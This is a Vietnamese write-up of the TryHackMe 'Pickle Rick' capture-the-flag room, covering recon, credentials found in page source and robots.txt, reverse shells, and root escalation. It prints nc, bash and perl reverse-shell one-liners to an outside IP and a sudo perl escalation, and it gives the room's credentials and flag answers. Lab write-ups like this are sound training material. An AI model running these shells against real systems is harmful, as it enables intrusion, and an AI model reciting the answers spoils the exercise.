Pickle Rick
===

Link: https://tryhackme.com/room/picklerick

---
## Mục lục <a name="menu"></a>

* [Mục lục](#menu)
* [Thu thập thông tin](#info)
* [Xác định lỗ hổng bảo mật](#vuln)
* [Tiến hành xâm nhập](#exploit)
* [Kết quả](#result)

---
## Thu thập thông tin <a name="info"></a>

Đầu tiên, mình tiến hành scan tổng quan 1000 port tcp, udp đầu, kết quả như sau:

![](https://i.imgur.com/ocJcJhw.png)

![](https://i.imgur.com/9QS3tsU.png)


Tất cả các port UDP đều đã bị filtered, TCP có 2 port đang mở:
* Port-22: OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (SSH)
* Port-80: Apache httpd 2.4.18 (HTTP)

Tiếp theo, mình tiến hành truy cập vào http://10.10.145.37:80 , xem qua front và source code thì mình tìm được username do admin để lại để ghi nhớ:

![](https://i.imgur.com/5o4bsMd.png)

> Username: R1ckRul3s

Giờ ta cần tìm password và 1 cổng đăng nhập để có thể tiến hành lấy shell và nâng câp quyền. Mình sẽ dùng gobuster để crawl trang tìm chỗ đăng nhập:

![](https://i.imgur.com/P1EHeIs.png)

Sau 1 lúc, mình crawl ra được trang login và phát hiện 1 chuỗi kí tự như password ở file robots.txt:

![](https://i.imgur.com/NjQkKWA.png)

> Password: Wubbalubbadubdub

![](https://i.imgur.com/cOZOwS8.png)

Thử dùng username với password tìm được để đăng nhập vào cổng thì thành công và vào được 1 command panel (shell cơ bản):

![](https://i.imgur.com/SCqXWh9.png)

Xem như các thông tin cần thiết đã có đủ, mình sẽ tiến tới xác định lỗ hổng và exploit.

---
## Xác định lỗ hổng bảo mật <a name="vuln"></a>

Nhập thử vài câu lệnh shell cơ bản vào cái command panel, mình thấy shell này rất hạn chế, nó không cho mình cd đi chỗ khác:

![](https://i.imgur.com/ycfuea6.png)

Phải tìm cách khác để có được shell mạnh hơn. Mình sẽ thử kiểm tra xem server có dùng python, bash, nc, ruby hay perl không:

``` 
which bash; which nc; which python; which perl; which ruby
```

![](https://i.imgur.com/NkuVCsB.png)

Kết quả cho thấy server có dùng bash, perl và nc. Do đó, mình sẽ tiến hành xâm nhập bằng cách tạo kết nối ngược từ server về máy mình(reverse shell) và sau đó tìm cách lấy quyền root.

---
## Tiến hành xâm nhập <a name="exploit"></a>

Trước khi dùng reverse shell, máy chúng ta phải lắng nghe connection tại 1 port bất kì trước đã (port > 1000), mình sẽ dùng nc để lắng nghe ở port 8089, câu lệnh như sau:

```
nc -vnlp 8089 
```

Sau đó, mình lần lượt thử các reverse shell nc, bash, perl:

```
* nc -e /bin/sh 10.0.0.1 1234
* bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
* perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

*(Nguồn: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)*
*(lưu ý: thay đổi ip và port phù hợp)*

Trong 3 cái chỉ có perl là có tác dụng và tạo được kết nối ngược từ server về máy mình, cho mình quyền user cơ bản 'www-data' : 

![](https://i.imgur.com/jBjR6f6.png)

Tới đây, mình sẽ nâng cấp quyền quản trị lên thành root để tiện hơn vì user hiện tại có shell rất hạn chế, câu lệnh sử dụng như sau: 

```
sudo perl -e 'exec "/bin/sh";'
```

*(Nguồn: https://gtfobins.github.io/gtfobins/perl/#sudo)*

Mình đã thành công lấy được quyền root:

![](https://i.imgur.com/WQeiHOY.png)

Cuối cùng, chỉ việc look around files system để tìm ra các ingredients.

---
## Kết quả <a name="result"></a>

First ingredients: var/www/html/Sup3rS3cretPickl3Ingred.txt

```
mr. meeseek hair
```

Second ingredients: /home/rick/second ingredients

```
> 1 jerry tear
```

Final ingredients: /root/3rd.txt

```
> fleeb juice
```
